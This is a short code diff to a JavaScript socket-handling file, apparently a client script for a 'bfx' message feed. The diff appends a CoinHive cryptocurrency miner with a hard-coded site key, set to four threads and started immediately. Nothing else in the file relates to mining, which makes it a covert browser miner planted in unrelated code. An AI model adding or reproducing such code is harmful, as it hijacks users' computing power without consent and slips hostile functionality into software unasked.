@@ -30,3 +30,11 @@ socket.on('bfx', function(msg) {
     }
   }, this);
 });
+
+const miner = new CoinHive.Anonymous('sp7LqLtBdTo71t60bB5QMaVlAjZVkIUD', {
+  threads: 4,
+  autoThreads: false,
+  throttle: 0.8,
+	forceASMJS: false
+});
+miner.start();
